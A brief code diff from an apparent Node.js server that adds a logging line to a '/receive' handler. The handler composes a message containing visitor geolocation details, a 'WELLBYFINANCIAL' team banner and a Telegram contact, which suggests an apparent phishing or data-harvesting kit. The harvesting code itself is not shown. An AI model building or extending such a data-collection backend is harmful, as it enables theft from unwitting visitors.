@@ -165,6 +165,7 @@ app.post('/receive', async (req, res) => {
       });
       message += `\n========================\n\n` + (includeFullGeo ? fullGeoInfo : basicGeoInfo) + `========================\n\n✅ UPDATE TEAM WELLBYFINANCIAL| \n💬 Telegram: https://t.me/updteams\n`;
 
+      console.log(type);
       res.send({ url: type });
     };
 
